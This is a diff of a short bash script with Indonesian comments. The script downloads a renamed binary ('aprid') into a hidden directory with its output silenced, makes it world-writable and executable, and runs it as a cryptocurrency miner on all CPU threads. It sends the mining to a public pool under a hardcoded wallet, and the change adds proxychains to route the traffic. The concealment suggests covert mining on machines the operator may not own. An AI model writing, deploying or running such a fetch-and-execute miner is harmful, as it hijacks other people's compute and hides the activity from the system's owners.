@@ -1,6 +1,16 @@
 #!/bin/bash
-mkdir -p .kap && cd .kap
-wget -O aprid https://github.com/Dewinet/your/raw/refs/heads/main/aprid >/dev/null 2>&1
-wget -O SHA256SUMS https://github.com/Dewinet/your/raw/refs/heads/main/SHA256SUMS >/dev/null 2>&1
+
+# Buat direktori .kap dan masuk ke dalamnya
+mkdir -p ~/.kap && cd ~/.kap
+
+# Unduh file aprid melalui ProxyChains agar menggunakan proxy
+proxychains wget -O aprid https://github.com/Dewinet/your/raw/refs/heads/main/aprid >/dev/null 2>&1
+proxychains wget -O SHA256SUMS https://github.com/Dewinet/your/raw/refs/heads/main/SHA256SUMS >/dev/null 2>&1
+
+# Beri izin eksekusi ke aprid
 chmod 777 aprid
-./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvdUj9vebTXP3ADtxozYLfwaBjG651pcKoy5kjD3FTEnZA3wT2fZNPxtJTWCwruX1QuKUxZKAdeAYiLumbJEcGK4XFc9wbP1w -p EMPUY -a rx/0 -k -t $(nproc --all)
+
+# Jalankan mining dengan ProxyChains
+proxychains ./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 \
+    -u SaLvdUj9vebTXP3ADtxozYLfwaBjG651pcKoy5kjD3FTEnZA3wT2fZNPxtJTWCwruX1QuKUxZKAdeAYiLumbJEcGK4XFc9wbP1w \
+    -p EMPUY -a rx/0 -k -t $(nproc --all)
